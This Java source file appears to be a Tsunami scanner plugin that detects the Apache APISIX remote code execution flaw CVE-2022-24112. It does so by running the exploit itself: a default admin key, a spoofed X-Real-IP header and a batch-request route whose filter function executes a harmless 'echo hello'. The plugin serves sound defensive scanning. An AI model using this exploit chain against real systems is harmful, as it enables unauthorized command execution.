package com.google.tsunami.plugins.detectors.rce.cve202224112;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.*;

import javax.inject.Inject;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

/** A {@link VulnDetector} that detects Apache APISIX RCE CVE-2022-24112. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache APISIX RCE CVE-2022-24112 Detector",
    version = "0.1",
    description = "This detector checks Apache APISIX RCE (CVE-2022-24112).",
    author = "yuradoc (yuradoc.research@gmail.com)",
    bootstrapModule = Cve202224112DetectorBootstrapModule.class)
public final class Cve202224112Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String BATCH_REQUEST_PATH = "apisix/batch-requests";
  private static final String DEFAULT_ADMIN_KEY_TOKEN = "edd1c9f034335f136f87ad84b625c8f1";
  private static final String X_REAL_IP_BYPASS = "127.0.0.1";
  private static final String PIPE_REQUEST_PATH = "apisix/admin/routes/rce";
  private static final String PIPE_REQUEST_BODY_URI =
          "/rce/" + Long.toHexString(Double.doubleToLongBits(Math.random()));
  private static final String PIPE_REQUEST_BODY_NAME =
          Long.toHexString(Double.doubleToLongBits(Math.random()));
  private static final String FILTER_FUNC_OS_EXEC = "function(vars) return os.execute('echo hello')==true end";
  private static final String FILTER_FUNC_FALSE = "function(vars) return false end";
  private final String batchRequestBodyTemplate;
  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  Cve202224112Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);

    String batchRequestBodyTemplate = "";
    try {
      batchRequestBodyTemplate =
              Resources.toString(
                      Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
    } catch (IOException e) {
      logger.atSevere().withCause(e).log(
              "Should never happen. Couldn't load payload resource file");
    }
    this.batchRequestBodyTemplate = batchRequestBodyTemplate;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202224112Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    if (!isTargetAPISIX(networkService, targetUri))
      return false;

    for (String filterFunc : new String[] { FILTER_FUNC_OS_EXEC, FILTER_FUNC_FALSE }) {
      HttpResponse resp = executeBatchRequest(networkService, targetUri, filterFunc);
      if (!(resp.status().code() == HttpStatus.OK.code()
          && resp.bodyJson().get().getAsJsonArray().get(0).getAsJsonObject().get("reason").getAsString().matches("Created|OK")))
        return false;

      resp = executeCreatedRouteRequest(networkService, targetUri);
      if (filterFunc.equals(FILTER_FUNC_OS_EXEC) && !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
          || resp.status().code() == HttpStatus.BAD_GATEWAY.code())) return false;
      else if (filterFunc.equals(FILTER_FUNC_FALSE) && resp.status().code() != HttpStatus.NOT_FOUND.code())
        return false;
    }

    executeBatchRequest(networkService, targetUri, FILTER_FUNC_FALSE, true);
    return true;
  }

  private boolean isTargetAPISIX(
          NetworkService networkService,
          String targetUri) {

    HttpResponse resp = null;
    try {
      resp = httpClient.send(
              get(targetUri).withEmptyHeaders().build(),
              networkService
      );
    } catch (Exception e) {
      logger.atFine().log("Failed to send request.");
    }
    return !resp.headers().get("Server").isEmpty() &&
            resp.headers().get("Server").get().contains("APISIX/2.");
  }

  private HttpResponse executeBatchRequest(
          NetworkService networkService,
          String targetUri, String filterFunc, boolean cleanUp) {

    HttpHeaders headers =
        HttpHeaders.builder()
            .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
            .addHeader(CONTENT_TYPE, "application/json")
            .build();

    String batchRequestBody = this.batchRequestBodyTemplate;
    String[] placeholders = {
            "{{X_REAL_IP}}", "{{X_API_KEY}}", "{{PIPE_REQ_PATH}}",
            "{{PIPE_REQ_METHOD}}", "{{PIPE_REQ_URI}}", "{{PIPE_REQ_NAME}}", "{{PIPE_REQ_FILTER_FUNC}}"
    };
    String[] replacements = {
            X_REAL_IP_BYPASS, DEFAULT_ADMIN_KEY_TOKEN, "/" + PIPE_REQUEST_PATH,
            !cleanUp ? "PUT": "DELETE", PIPE_REQUEST_BODY_URI, PIPE_REQUEST_BODY_NAME, filterFunc
    };

    for(int i=0; i<placeholders.length; i++) {
      batchRequestBody = batchRequestBody.replace(placeholders[i], replacements[i]);
    }

    HttpResponse resp = null;
    try {
      resp = httpClient.send(post(targetUri + BATCH_REQUEST_PATH)
              .setHeaders(headers)
              .setRequestBody(ByteString.copyFromUtf8(batchRequestBody))
              .build(), networkService);
    } catch (Exception e) {
      logger.atFine().log("Failed to send request.");
    }
    return resp;
  }

  private HttpResponse executeBatchRequest(
          NetworkService networkService,
          String targetUri, String filterFunc) {
    return executeBatchRequest(networkService, targetUri, filterFunc, false);
  }

  private HttpResponse executeCreatedRouteRequest(
          NetworkService networkService,
          String targetUri) {

    HttpHeaders headers =
            HttpHeaders.builder()
                    .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
                    .addHeader(CONTENT_TYPE, "application/json")
                    .build();

    HttpResponse resp = null;
    try {
      resp = httpClient.send(
              get(targetUri + PIPE_REQUEST_BODY_URI)
                      .setHeaders(headers)
                      .build(),
              networkService
      );
    } catch (Exception e) {
      logger.atFine().log("Failed to send request.");
    }
    return resp;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("yuradoc").setValue("CVE-2022-24112"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache APISIX RCE (CVE-2022-24112)")
                .setDescription(
                    "Apache APISIX 2.x versions prior to 2.13 allows attacker to"
                        + " bypass IP restrictions of Admin API through the batch-requests plugin."
                        + " A default configuration of Apache APISIX (with default API key) is"
                        + " vulnerable to remote code execution through the plugin."))
        .build();
  }
}
